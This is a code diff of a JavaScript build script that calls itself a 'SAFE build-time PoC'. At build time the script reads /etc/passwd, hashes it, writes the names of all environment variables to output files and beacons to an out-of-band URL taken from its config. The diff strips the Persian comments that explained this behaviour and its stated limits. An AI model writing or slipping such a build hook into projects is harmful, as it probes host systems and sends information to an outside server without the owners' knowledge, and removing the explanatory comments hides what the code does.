@@ -34,21 +34,18 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  // هدف: تست دسترسی به فایل‌سیستم
   const target = "/etc/passwd";
   let exists = false, size = -1, sha256 = "n/a";
   try {
-    const buf = fs.readFileSync(target); // محتوا را ارسال نمی‌کنیم
+    const buf = fs.readFileSync(target);
     exists = true;
     size = buf.length;
     sha256 = crypto.createHash("sha256").update(buf).digest("hex");
   } catch {
-    // فایل در دسترس نیست یا خطا در خواندن
   }
 
   const nonce = crypto.randomBytes(8).toString("hex");
 
-  // گزارش محلی (برای اسکرین‌شات)
   const report = [
     "SAFE build-time PoC",
     `time: ${new Date().toISOString()}`,
@@ -63,11 +60,9 @@ function beacon(urlStr, q) {
   ].join("\n") + "\n";
   fs.writeFileSync(path.join(outDir, "_wf_poc.txt"), report, "utf8");
 
-  // فقط نام متغیرهای محیطی (بدون مقادیر)
   const envKeys = Object.keys(process.env).sort();
   fs.writeFileSync(path.join(outDir, "_wf_env_keys.txt"), envKeys.join("\n") + "\n", "utf8");
 
-  // ارسال امن به OOB
   const cfg = readConfig();
   beacon(cfg.oob_url, {
     s: stage,
